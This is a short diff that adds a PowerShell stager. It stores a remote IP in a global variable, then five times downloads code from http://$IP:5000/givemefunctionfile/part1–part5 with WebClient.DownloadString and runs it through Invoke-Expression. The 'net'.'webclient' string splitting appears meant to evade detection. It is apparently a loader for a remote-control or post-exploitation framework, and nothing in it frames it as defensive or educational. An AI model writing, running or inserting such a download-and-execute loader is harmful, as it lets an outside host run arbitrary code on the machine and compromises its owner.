@@ -1,0 +1,7 @@
+$global:remoteip = "$IP"
+
+Invoke-Expression(new-object net'.'webclient).downloadstring("http://$IP:5000/givemefunctionfile/part1")
+Invoke-Expression(new-object net'.'webclient).downloadstring("http://$IP:5000/givemefunctionfile/part2")
+Invoke-Expression(new-object net'.'webclient).downloadstring("http://$IP:5000/givemefunctionfile/part3")
+Invoke-Expression(new-object net'.'webclient).downloadstring("http://$IP:5000/givemefunctionfile/part4")
+Invoke-Expression(new-object net'.'webclient).downloadstring("http://$IP:5000/givemefunctionfile/part5")
